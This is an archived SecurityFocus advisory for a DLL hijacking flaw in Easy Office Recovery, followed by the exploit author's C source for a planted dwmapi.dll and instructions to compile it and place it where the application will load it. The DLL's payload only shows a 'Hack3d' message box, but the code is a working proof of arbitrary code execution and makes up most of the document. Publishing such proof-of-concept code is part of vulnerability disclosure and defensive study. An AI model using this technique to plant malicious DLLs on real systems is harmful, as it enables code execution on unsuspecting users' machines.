source: http://www.securityfocus.com/bid/43416/info

Easy Office Recovery is prone to a vulnerability that lets attackers execute arbitrary code.

An attacker can exploit this issue by enticing a legitimate user to use the vulnerable application to open a file from a network share location that contains a specially crafted Dynamic Link Library (DLL) file. 

/*
#SEasyOfficeRecovery DLL Hijacking Exploit (dwmapi.dll)
#Author : anT!-Tr0J4n
#Greetz : Dev-PoinT.com ~ inj3ct0r.com ~ AHMeD ALAMRi ~,All Dev-poinT members and my friends
#Email   : D3v-PoinT@hotmail.com & C1EH@Hotmail.com
# Software Link:http://www.munsoft.com/downloads
#Tested on: Windows XP sp3
#how to use :
   Complile and rename to dwmapi.dll. Place it in the same dir  Execute to check the
  result > Hack3d 



 
#dwmapi.dll (code)
*/
 
#include "stdafx.h"
 
void init() {
MessageBox(NULL,"anT!-Tr0J4n", "Hack3d",0x00000003);
}
 
 
BOOL APIENTRY DllMain( HANDLE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
 )
{
    switch (ul_reason_for_call)
{
case DLL_PROCESS_ATTACH:
 init();break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
 case DLL_PROCESS_DETACH:
break;
    }
    return TRUE;
}